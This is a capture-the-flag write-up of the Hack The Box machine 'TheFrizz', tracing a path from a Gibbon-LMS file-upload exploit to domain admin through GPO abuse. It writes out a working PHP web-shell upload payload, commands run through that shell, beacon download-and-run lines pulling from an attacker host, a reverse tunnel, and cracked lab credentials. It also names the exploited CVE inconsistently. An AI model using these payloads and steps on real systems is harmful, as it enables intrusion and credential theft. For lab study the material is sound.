---
icon: cloud-drizzle
---

# HTB-TheFRIZZ

<figure><img src="../../../../.gitbook/assets/image (443).png" alt=""><figcaption></figcaption></figure>

#### **Attack Flow Explanation**

1. **Execution Phase**
   * The attack begins by exploiting **Gibbon-LMS running on port 80**.
   * Using **CVE-2023-0025 (File Upload Vulnerability)**, a shell is obtained as the **`w.webservice` user**.
2. **Privilege Escalation Phase**
   * From the web shell, the attacker connects to the **MySQL database**, where the **password hash for `f.frizzle`** is retrieved.
   * The hash is cracked, revealing valid credentials, which provides a shell as **`f.frizzle`**.
   * Further exploration uncovers an **archive in the Recycle Bin** containing a **configuration file with an encoded password**.
   * Decoding the password and performing a **password spray** identifies valid credentials for **`m.schoolbus`**.
   * The `m.schoolbus` account has the ability to **link Group Policy Objects (GPOs) to the Domain Controllers OU**.
   * Abusing this privilege, the attacker creates and links a malicious GPO to grant **membership in the Administrators group**.
   * With these privileges applied, the attacker finally obtains a shell as **Domain Administrator**, completing the attack path and enabling collection of the final flag.

***

## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ blah blah
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.60:22
Open 10.10.11.60:53
Open 10.10.11.60:88
Open 10.10.11.60:135
Open 10.10.11.60:139
Open 10.10.11.60:389
Open 10.10.11.60:445
Open 10.10.11.60:464
Open 10.10.11.60:593
Open 10.10.11.60:636
Open 10.10.11.60:9389
Open 10.10.11.60:49664
Open 10.10.11.60:49667
Open 10.10.11.60:49670
Open 10.10.11.60:56623
Open 10.10.11.60:56637
^[[B^[[B^[[B[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 05:43 UTC
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:43
Stats: 0:00:10 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE: Active NSE Script Threads: 1 (0 waiting)
NSE Timing: About 0.00% done
Completed NSE at 05:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:43
Completed NSE at 05:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:43
Completed NSE at 05:43, 0.00s elapsed
Initiating SYN Stealth Scan at 05:43
Scanning frizzdc.frizz.htb (10.10.11.60) [16 ports]
Discovered open port 53/tcp on 10.10.11.60
Discovered open port 464/tcp on 10.10.11.60
Discovered open port 22/tcp on 10.10.11.60
Discovered open port 135/tcp on 10.10.11.60
Discovered open port 445/tcp on 10.10.11.60
Discovered open port 139/tcp on 10.10.11.60
Discovered open port 56637/tcp on 10.10.11.60
Discovered open port 49670/tcp on 10.10.11.60
Discovered open port 389/tcp on 10.10.11.60
Discovered open port 636/tcp on 10.10.11.60
Discovered open port 593/tcp on 10.10.11.60
Discovered open port 49664/tcp on 10.10.11.60
Discovered open port 9389/tcp on 10.10.11.60
Discovered open port 56623/tcp on 10.10.11.60
Discovered open port 88/tcp on 10.10.11.60
Discovered open port 49667/tcp on 10.10.11.60
Completed SYN Stealth Scan at 05:43, 0.43s elapsed (16 total ports)
Initiating Service scan at 05:43
Scanning 16 services on frizzdc.frizz.htb (10.10.11.60)
Completed Service scan at 05:44, 60.05s elapsed (16 services on 1 host)
Initiating OS detection (try #1) against frizzdc.frizz.htb (10.10.11.60)
Retrying OS detection (try #2) against frizzdc.frizz.htb (10.10.11.60)
Initiating Traceroute at 05:44
Completed Traceroute at 05:44, 0.26s elapsed
Initiating Parallel DNS resolution of 1 host. at 05:44
Completed Parallel DNS resolution of 1 host. at 05:44, 0.23s elapsed
DNS resolution of 1 IPs took 0.24s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
NSE: Script scanning 10.10.11.60.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:44
NSE Timing: About 99.96% done; ETC: 05:45 (0:00:00 remaining)
Completed NSE at 05:45, 40.87s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 3.31s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
Nmap scan report for frizzdc.frizz.htb (10.10.11.60)
Host is up, received user-set (0.25s latency).
Scanned at 2025-08-26 05:43:35 UTC for 114s

PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-26 12:43:46Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
56623/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56637/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/26%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=68AD49F9%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=104%TI=I%II=I%SS=S%TS=A)
SEQ(SP=105%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=A)
OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.004 days (since Tue Aug 26 05:39:43 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21203/tcp): CLEAN (Timeout)
|   Check 2 (port 20627/tcp): CLEAN (Timeout)
|   Check 3 (port 49509/udp): CLEAN (Timeout)
|   Check 4 (port 41962/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-26T12:44:49
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   219.69 ms 10.10.14.1
2   219.86 ms frizzdc.frizz.htb (10.10.11.60)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.70 seconds
           Raw packets sent: 101 (8.152KB) | Rcvd: 45 (2.680KB)

```

The Rustscan results indicate that the target is the Domain Controller (FRIZZDC) for the frizz.htb domain. To proceed, I will add the domain, along with its hostname and FQDN, to the `/etc/hosts` file.

## Directory Enumeration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ feroxbuster -u http://frizzdc.frizz.htb --dont-extract-links -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://frizzdc.frizz.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       33w      303c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       30w      306c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        9l       28w      321c http://frizzdc.frizz.htb/ => http://frizzdc.frizz.htb/home/
301      GET        9l       30w      345c http://frizzdc.frizz.htb/home => http://frizzdc.frizz.htb/home/
301      GET        9l       30w      352c http://frizzdc.frizz.htb/home/images => http://frizzdc.frizz.htb/home/images/
301      GET        9l       30w      348c http://frizzdc.frizz.htb/home/js => http://frizzdc.frizz.htb/home/js/
301      GET        9l       30w      349c http://frizzdc.frizz.htb/home/css => http://frizzdc.frizz.htb/home/css/
301      GET        9l       30w      351c http://frizzdc.frizz.htb/home/fonts => http://frizzdc.frizz.htb/home/fonts/
[####################] - 6m    159504/159504  0s      found:6       errors:9218
[####################] - 5m     26584/26584   91/s    http://frizzdc.frizz.htb/ 
[####################] - 5m     26584/26584   81/s    http://frizzdc.frizz.htb/home/ 
[####################] - 6m     26584/26584   80/s    http://frizzdc.frizz.htb/home/images/ 
[####################] - 5m     26584/26584   83/s    http://frizzdc.frizz.htb/home/js/ 
[####################] - 5m     26584/26584   82/s    http://frizzdc.frizz.htb/home/css/ 
[####################] - 6m     26584/26584   80/s    http://frizzdc.frizz.htb/home/fonts/  
```

The scan did not reveal any new information beyond what I had already discovered.

### SMB - TCP 445 <a href="#smb---tcp-445" id="smb---tcp-445"></a>

NetExec confirms that NTLM is disabled. It also does not flag the Guest account, even though I configured it to check for this using the new feature.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ netexec smb 10.10.11.60
SMB         10.10.11.60     445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
```

Because NTLM is disabled, any attempt to authenticate with it returns `STATUS_NOT_SUPPORTED`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ netexec smb 10.10.11.60 -u guest -p '' --shares
SMB         10.10.11.60     445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.60     445    frizzdc          [-] frizz.htb\guest: STATUS_NOT_SUPPORTED 
                                                                                                                                                             
┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ netexec smb 10.10.11.60 -u sn0x -p '' --shares
SMB         10.10.11.60     445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.60     445    frizzdc          [-] frizz.htb\sn0x: STATUS_NOT_SUPPORTED 

```

## CVE-2023-45878 <a href="#identify-cve-2023-45878" id="identify-cve-2023-45878"></a>

Searching for 'gibbon v25.0.00 cve' returns multiple CVEs associated with this version

<figure><img src="../../../../.gitbook/assets/image (447).png" alt=""><figcaption></figcaption></figure>

Among the various vulnerabilities identified, including LFI and XSS, the most critical one is CVE-2023-45878, as it enables unauthenticated Remote Code Execution (RCE).

This vulnerability affects GibbonEdu Gibbon version 25.0.1 and earlier. It exists because the `rubrics_visualise_saveAjax.phps` endpoint does not enforce authentication. The endpoint accepts three parameters: `img`, `path`, and `gibbonPersonID`. The `img` parameter expects a base64-encoded image. If the `path` parameter is set, it is appended to the installation directory’s absolute path, and the decoded `img` content is written to the specified location.

By abusing this functionality, an attacker can create malicious PHP files within the application directory, ultimately achieving unauthenticated Remote Code Execution.

### Deployment

<figure><img src="../../../../.gitbook/assets/image (445).png" alt=""><figcaption></figcaption></figure>

The webpage at `http://frizzdc.frizz.htb/home/` belongs to Walkerville Elementary School. Reviewing the HTML source code reveals multiple references to Gibbon-LMS. Further inspection of the loaded JavaScript and CSS files suggests that the application is running version 25.0.00.1611200873.

A quick online search shows that this version is vulnerable to CVE-2023-0025, a file upload vulnerability that allows arbitrary file uploads. A publicly available proof-of-concept (PoC) exploit exists for this issue.

By sending a POST request to `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php` using the PoC payload, the server responds with a 200 status code, confirming successful exploitation. This results in a web shell being uploaded, which is accessible at `/Gibbon-LMS/asdf.php`.

<figure><img src="../../../../.gitbook/assets/image (446).png" alt=""><figcaption></figcaption></figure>

```
img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&path=asdf.php&gibbonPersonID=0000000001
```

I first executed the `whoami` command, which confirmed that the current user is `frizz\w.webservice`. After this, I proceeded to establish a reverse shell for further access.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ curl "http://frizzdc.frizz.htb/Gibbon-LMS/asdf.php?cmd=whoami"
frizz\w.webservice
frizz\w.webservice

┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ curl "http://frizzdc.frizz.htb/Gibbon-LMS/asdf.php?cmd=powershell+-e+JABjAGwAa<REDACTED>"

```

## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

### Shell as f.frizzle <a href="#shell-as-ffrizzle" id="shell-as-ffrizzle"></a>

Next, I generated a new Sliver beacon and uploaded it to `C:\Windows\Temp\r.exe`. Upon executing the binary, I received a callback on my team server, allowing me to establish an interactive session with the target.

`C:\xampp\htdocs\Gibbon-LMS\config.php`

<pre class="language-bash"><code class="lang-bash">&#x3C;?php
/*
Gibbon, Flexible &#x26; Open School System
Copyright (C) 2010, Ross Parker
 
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
 
You should have received a copy of the GNU General Public License
along with this program.  If not, see &#x3C;http://www.gnu.org/licenses/>.
*/
 
/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
<strong>$databaseServer = 'localhost';
</strong><strong>$databaseUsername = 'MrGibbonsDB';
</strong><strong>$databasePassword = 'MisterGibbs!Parrot!?1';
</strong><strong>$databaseName = 'gibbon';
</strong> 
/**
 * Sets a globally unique id, to allow multiple installs on a single server.
 */
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';
 
/**
 * Sets system-wide caching factor, used to balance performance and freshness.
 * Value represents number of page loads between cache refresh.
 * Must be positive integer. 1 means no caching.
 */
$caching = 10;
</code></pre>

To access the locally running MySQL database, I set up a SOCKS proxy using Chisel. I started a local listener with `chisel server --port 1337 --reverse`, which received a callback from the target. As a result, the proxy is now active and listening on port 1080

```bash
sliver (thefrizz) > chisel client 10.10.10.10:1337 R:socks
 
[*] Successfully executed chisel
[*] Got output:
received argstring: client 10.10.10.10:1337 R:socks
os.Args = [chisel.exe client 10.10.10.10:1337 R:socks]
Task started successfully.
```

Using the newly established connection, I accessed the database via ProxyChains and MySQL. Within the `gibbonperson` table, I found only one user entry. I then extracted the password hash along with its corresponding salt for the user `f.frizzle`

<pre class="language-bash"><code class="lang-bash">┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ proxychains -q mysql -u 'MrGibbonsDB' \
                       -p'MisterGibbs!Parrot!?1' \
                       -D gibbon \
                       -h 127.0.0.1 \
                       --skip-ssl \
                       --silent
 
MariaDB [gibbon]> select username,passwordStrong,passwordStrongSalt from gibbonperson;
<strong>username        passwordStrong  passwordStrongSalt
</strong><strong>f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489
</strong></code></pre>

Gibbon-LMS uses the SHA256 hashing algorithm with the format `$salt.$password1`. Based on the example hashes, this can be cracked using Hashcat mode 1420. The cracking process completed within a few seconds, successfully revealing the credentials: `f.frizzle : Jenni_Luvs_Magic23`

<pre class="language-bash"><code class="lang-bash">┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ hashcat -m 1420 \
          '067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489' \
          /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

<strong>067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
</strong>                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1420 (sha256($salt.$pass))
Hash.Target......: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff...Vz2489
Time.Started.....: Tue Aug 26 07:57:12 2025 (4 secs)
Time.Estimated...: Tue Aug 26 07:57:16 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2459.6 kH/s (0.23ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11022336/14344385 (76.84%)
Rejected.........: 0/11022336 (0.00%)
Restore.Point....: 11018240/14344385 (76.81%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: JessdoG1 -> JazIris@@
Hardware.Mon.#1..: Util: 26%

</code></pre>

Reviewing the group memberships for the user `f.frizzle` shows that they belong to the _Remote Management Users_ group. This indicates that it should be possible to obtain an interactive shell on the target

<pre class="language-bash"><code class="lang-bash">sliver (thefrizz) > execute -o cmd /c net user /domain f.frizzle
 
[*] Output:
User name                    f.frizzle
Full Name                    fiona frizzle
Comment                      Wizard in Training
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never
 
Password last set            10/29/2024 7:27:03 AM
Password expires             Never
Password changeable          10/29/2024 7:27:03 AM
Password required            Yes
User may change password     Yes
 
Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   5/17/2025 2:03:19 PM
 
Logon hours allowed          All
 
<strong>Local Group Memberships      *Remote Management Use
</strong><strong>Global Group memberships     *Domain Users         
</strong>The command completed successfully.
</code></pre>

Since WinRM is not available, I switched to using SSH for access. However, this required configuring `krb5.conf` with the correct values, which I automated using a small Python script.

```bash
$ python3 configure_krb5.py frizz.htb frizzdc
[*] This script must be run as root
[sudo] password for sn0x:
[*] Configuration Data:
[libdefaults]
        default_realm = FRIZZ.HTB
 
[realms]
        FRIZZ.HTB = {
                kdc = frizzdc.frizz.htb
                admin_server = frizzdc.frizz.htb
        }
 
[domain_realm]
        frizz.htb = FRIZZ.HTB
        .frizz.htb = FRIZZ.HTB
 
 
[!] Above Configuration will overwrite /etc/krb5.conf, are you sure? [y/N] y
[+] /etc/krb5.conf has been configured
```

Next, I used Impacket’s `getTGT` to request a new TGT, adjusting the system time to match the Domain Controller, which was 7 hours ahead. The ticket was saved as `f.frizzle.ccache`, and I exported it as the environment variable `KRB5CCNAME` so that SSH could use it for authentication. This granted me access to the host via a PowerShell session, where I proceeded to download and execute my Sliver binary

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ faketime -f +7h impacket-getTGT 'frizz.htb/f.frizzle':'Jenni_Luvs_Magic23'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in f.frizzle.ccache
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ export KRB5CCNAME=f.frizzle.ccache
```

```powershell
┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ faketime -f +7h ssh -K f.frizzle@FRIZZ.HTB@FRIZZDC.FRIZZ.HTB
The authenticity of host 'frizzdc.frizz.htb (10.10.11.60)' can't be established.
ED25519 key fingerprint is SHA256:667C2ZBnjXAV13iEeKUgKhu6w5axMrhU346z2L2OE7g.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:15: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'frizzdc.frizz.htb' (ED25519) to the list of known hosts.
PowerShell 7.4.5

PS C:\Users\f.frizzle\Desktop> ls

    Directory: C:\Users\f.frizzle\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar--           8/26/2025  5:40 AM             34 user.txt

PS C:\Users\f.frizzle> cd Desktop
PS C:\Users\f.frizzle\Desktop> cat user.txt
1e6c9e7d77f1438f33deb454bdd824c5
PS C:\Users\f.frizzle\Desktop>
PS C:\Users\f.frizzle> iwr http://10.10.xx.xx/thefrizz.exe -useba -outfile r.exe
PS C:\Users\f.frizzle> .\r.exe
```

### Shell as m.schoolbus <a href="#shell-as-mschoolbus" id="shell-as-mschoolbus"></a>

While exploring the system, I discovered an interesting file located in the Recycle Bin. Using the C2 session, I downloaded the 7z archive to my local host for further analysis.

<pre class="language-bash"><code class="lang-bash">sliver (thefrizz) > nps ls C:\\$RECYCLE.BIN\\S-1-5-21-2386970044-1145388522-2932701813-1103 -force
 
[*] nps output:
Mode   LastWriteTime         Length   Name 
----   -------------         ------   ----
-a---- 10/29/2024 7:31:09 AM 148      $IE2XMEG.7z
<strong>-a---- 10/24/2024 9:16:29 PM 30416987 $RE2XMEG.7z
</strong>-a-hs- 10/29/2024 7:31:09 AM 129      desktop.ini
 
sliver (thefrizz) > download C:\\$RECYCLE.BIN\\S-1-5-21-2386970044-1145388522-2932701813-1103\\$RE2XMEG.7z RE2XMEG.7z
 
[*] Wrote 30416987 bytes (1 file successfully, 0 files unsuccessfully) to RE2XMEG.7z
</code></pre>

After extracting the archive, I searched for the string `password` and found several matches. Narrowing the search to the `conf` folder revealed an interesting entry in `waptserver.ini`. The password value was base64-encoded, and decoding it produced the plaintext credential: `!suBcig@MehTed!R`

`wapt/conf/waptserver.ini`

<pre class="language-bash"><code class="lang-bash">[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
<strong>wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
</strong>clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt
 
[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log
</code></pre>

Because the configuration file did not reference a specific account, I decided to perform a password spray across all users. The attempt succeeded only for the account `m.schoolbus`. This account also belongs to the _Remote Management Users_ group, which allowed me to establish an SSH session and execute my Sliver payload.

<pre class="language-bash"><code class="lang-bash">sliver (thefrizz) > c2tc-spray-ad '!suBcig@MehTed!R' * kerberos
 
[*] Successfully executed c2tc-spray-ad (coff-loader)
[*] Got output:
[+] Password correct for useraccount: M.SchoolBus
--------------------------------------------------------------------
[+] Password correct for useraccount(s):
<strong>    M.SchoolBus
</strong>--------------------------------------------------------------------
Program execution time: 0.33 seconds
 
Domain tested: frizz.htb
Applied LDAP filter: (&#x26;(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(sAMAccountName=*))
Password tested: !suBcig@MehTed!R
 
Total AD accounts tested: 19
Failed Kerberos authentications: 18
Successful Kerberos authentications: 1
</code></pre>

### Shell as Administrator <a href="#shell-as-administrator" id="shell-as-administrator"></a>

Using `bloodhound-python-ce`, I collected the necessary data to be ingested into BloodHound for further analysis of the Active Directory environment

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Frizz]
└─$ faketime -f +7h bloodhound-ce-python -k \      
                                       -d frizz.htb \    
                                       -dc frizzdc.frizz.htb \
                                       -u f.frizzle \    
                                       -p Jenni_Luvs_Magic23 \
                                       -c ALL \
                                       --zip \    
                                       --dns-tcp \       
                                       -ns 10.129.128.240
```

<figure><img src="../../../../.gitbook/assets/image (449).png" alt=""><figcaption></figcaption></figure>

Analyzing the BloodHound data revealed an attack path from the `m.schoolbus` account to the domain object. Specifically, this account has the rights to link a Group Policy Object (GPO) to the _Domain Controllers_ organizational unit.

Well ! To exploit this BloodHound-identified edge, I created a new Group Policy Object (GPO) named `sn0x` and linked it to the OU containing the Domain Controller. Using `SharpGPOAbuse`, I modified the policy to add the `m.schoolbus` account to the local Administrators group. Finally, I forced a policy update on the target host to apply the changes.

```bash
sliver (thefrizz) > execute -o powershell -c 'New-GPO -Name sn0x | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes'
[*] Output:

GpoId       : 164bd8d4-c838-4c85-a12b-25dc9d0dfde1
DisplayName : sn0x
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 2
sliver (thefrizz) > execute-assembly -- SharpGPOAbuse.exe --AddLocalAdmin --UserAccount m.schoolbus --GPOName sn0x
[*] Output:
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] SID Value of m.schoolbus = S-1-5-21-2386970044-1145388522-2932701813-1106
[+] GUID of "sn0x" is: {058E4585-AEF2-465B-9D61-9B03F9E56F22}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{058E4585-AEF2-465B-9D61-9B03F9E56F22}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
sliver (thefrizz) > execute -o cmd /c gpupdate /force
[*] Output:
Updating policy...
Computer Policy update has completed successfully.
User Policy update has completed successfully.

```

Once the new GPO took effect, I launched a Sliver session using RunasCs. While interacting with the session, I confirmed that the updated group membership was successfully applied. With administrative privileges in place, I was able to retrieve the final flag.

```bash
sliver (thefrizz) > execute-assembly /home/sn0x/tools/runascs/RunasCs.exe m.schoolbus '!suBcig@MehTed!R' "C:\\tools\\r.exe" -t 0
 
[*] Session 746e96bc thefrizz - 10.129.128.240:59477 (frizzdc) - windows/amd64 - Sat, 17 May 2025 17:40:27 CEST
 
[*] Output:
 
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-291d7f$\Default
[+] Async process 'C:\tools\r.exe' with pid 3216 created in background.
 
sliver (thefrizz) > use 746e96bc
 
sliver (thefrizz) > sa-whoami
 
[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:
 
UserName                SID
====================== ====================================
frizz\M.SchoolBus       S-1-5-21-2386970044-1145388522-2932701813-1106
 
 
GROUP INFORMATION                                 Type                     SID                                          Attributes
================================================= ===================== ============================================= ==================================================
frizz\Domain Users                                Group                    S-1-5-21-2386970044-1145388522-2932701813-513 Mandatory group, Enabled by default, Enabled group,
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,
